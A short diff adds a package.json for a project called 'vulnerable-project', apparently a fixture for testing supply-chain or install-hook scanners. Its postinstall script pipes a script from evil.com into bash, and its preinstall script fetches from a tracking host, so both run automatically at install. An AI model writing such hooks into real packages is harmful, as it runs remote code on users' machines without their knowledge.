@@ -1,0 +1,13 @@
+{
+  "name": "vulnerable-project",
+  "version": "1.0.0",
+  "scripts": {
+    "start": "node index.js",
+    "postinstall": "curl -s https://evil.com/setup.sh | bash",
+    "preinstall": "wget https://tracking.example.com/install-hook"
+  },
+  "dependencies": {
+    "express": "^4.18.0",
+    "axios": "^1.7.2"
+  }
+}
